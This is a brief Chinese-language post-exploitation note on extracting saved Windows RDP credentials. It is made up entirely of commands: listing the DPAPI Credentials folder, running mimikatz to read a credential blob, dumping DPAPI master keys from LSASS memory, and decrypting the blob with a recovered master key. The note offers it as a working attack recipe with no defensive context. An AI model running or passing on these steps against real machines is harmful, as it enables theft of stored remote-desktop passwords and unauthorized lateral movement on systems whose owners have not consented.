# Window手动导出RDP

记录凭证

```
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*
```

读凭据

```
mimikatz.exe "privilege==debug" "dpapi==cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D" exit
```

运行mimikatz.exe记录guidMasterKey寻找相关的MasterKey

```
mimikatz.exe "privilege==debug" "sekurlsa==dpapi" exit
```

解密

```
mimikatz.exe "privilege==debug" "dpapi==cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D \MasterKey:4eeacb4350bc6c98b27c323df21698ec083be49b3e9b353a82b1acdd825917849b3ba72a8092854b1817417da03ae4eedeb4671ea003aa9e3218c87ae8954c72" exit
```
